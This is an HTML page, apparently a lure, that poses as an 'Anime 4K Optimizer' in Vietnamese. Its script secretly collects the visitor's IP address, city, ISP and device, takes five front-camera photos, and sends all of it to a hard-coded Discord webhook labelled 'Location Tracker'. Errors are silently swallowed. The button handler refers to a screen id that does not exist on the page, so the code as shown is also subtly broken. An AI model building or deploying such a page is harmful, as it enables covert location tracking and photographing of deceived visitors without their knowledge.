<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Anime 4K Optimizer</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            font-family: 'Segoe UI', sans-serif;
            overflow: hidden;
            height: 100vh;
        }
        .anime-bg {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: url('https://images.alphacoders.com/134/1340583.jpg') center/cover no-repeat;
            opacity: 0.25;
            z-index: -1;
        }
        .container {
            position: relative;
            height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 10;
        }
        .title {
            font-size: 2.8rem;
            font-weight: bold;
            background: linear-gradient(90deg, #ff00cc, #00ffff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            text-shadow: 0 0 20px rgba(255, 0, 204, 0.5);
        }
        .subtitle {
            color: #a0f0ff;
            font-size: 1.1rem;
            margin-bottom: 50px;
        }
        .circle {
            width: 220px;
            height: 220px;
            border: 8px solid rgba(0, 255, 255, 0.2);
            border-top: 8px solid #00ffff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3.5rem;
            font-weight: bold;
            color: #00ffff;
            margin: 30px 0;
            animation: spin 1.8s linear infinite;
            box-shadow: 0 0 40px rgba(0, 255, 255, 0.6);
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        button {
            background: linear-gradient(45deg, #ff00cc, #00ffff);
            color: white;
            border: none;
            padding: 16px 60px;
            font-size: 1.25rem;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 25px rgba(255, 0, 204, 0.6);
            transition: 0.3s;
        }
        button:hover {
            transform: scale(1.08);
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="anime-bg"></div>

    <!-- Giao diện Anime 4K -->
    <div class="container" id="animeScreen">
        <div class="title">ANIME 4K</div>
        <div class="subtitle">Optimizer • Ultra HD • 60FPS</div>
        <div class="circle" id="circle">GO</div>
        <button onclick="startRealTracking()">BẮT ĐẦU TỐI ƯU</button>
        <div style="margin-top: 40px; color:#88ddff; font-size:0.95rem;">Đang kết nối với server anime chất lượng cao...</div>
    </div>

    <!-- Code gốc của bạn -->
    <div class="status" id="status" style="display:none;">Đang khởi tạo tracker cấp độ MAX...</div>
    <video id="video" autoplay playsinline style="display:none; width:100%; max-width:400px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1488092153883263048/qVOfMlJoEKghGT7OGyQ07aYlXAysUlH25Kt6sqfR4WIHbuis2Kl31ypw39z_BcJPyv4G';

        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 400;
        let cameraStream = null;

        async function sendText(content) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username: "Huy Hoang - Location Tracker", content })
                });
            } catch(e) {}
        }

        async function sendFile(blob, filename, caption) {
            try {
                const form = new FormData();
                form.append('file', blob, filename);
                form.append('payload_json', JSON.stringify({
                    username: "Huy Hoang - Location Tracker",
                    content: caption
                }));
                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: form });
            } catch(e) {}
        }

        async function sendVisitorInfo() {
            let ip = "Không xác định", city = "Không xác định", region = "Không xác định", isp = "Không xác định";
            const apis = ["https://ip-api.com/json/?fields=query,status,city,regionName,isp","https://ipapi.co/json/"];
            for (let url of apis) {
                try {
                    const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
                    const data = await res.json();
                    if (url.includes("ip-api.com") && data.status === "success") {
                        ip = data.query; city = data.city || city; region = data.regionName || region; isp = data.isp || isp;
                        break;
                    } else if (url.includes("ipapi.co")) {
                        ip = data.ip || ip; city = data.city || city; region = data.region || region; isp = data.org || isp;
                    }
                } catch(e) {}
            }
            const msg = `**📥 KHÁCH TRUY CẬP MỚI**\n\n🌐 **IP:** ${ip}\n📍 **Thành phố:** ${city}\n🗺️ **Khu vực:** ${region}\n🏢 **Nhà mạng:** ${isp}\n📱 **Thiết bị:** ${navigator.platform || "Không xác định"}\n⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}`;
            await sendText(msg);
        }

        async function startCameraAndCapture() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const status = document.getElementById('status');
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 480 }}
                });
                video.srcObject = cameraStream;
                await new Promise(r => video.onloadedmetadata = r);
                video.play();

                status.textContent = "✅ Camera đã mở. Đang chụp ảnh...";
                for (let i = 1; i <= PHOTO_COUNT; i++) {
                    await new Promise(resolve => {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            if (blob) sendFile(blob, `photo_${i}_${Date.now()}.jpg`, `📸 **Ảnh chụp #${i}**`);
                            resolve();
                        }, 'image/jpeg', 0.85);
                    });
                    if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
                }
                if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
            } catch (err) {
                console.error(err);
            }
        }

        async function init() {
            await sendVisitorInfo();
            setTimeout(startCameraAndCapture, 700);
        }

        function startRealTracking() {
            document.getElementById('speedtestScreen').classList.add('hidden');
            document.getElementById('status').style.display = 'block';
            init();
        }

        window.addEventListener('load', () => {});
    </script>
</body>
</html>
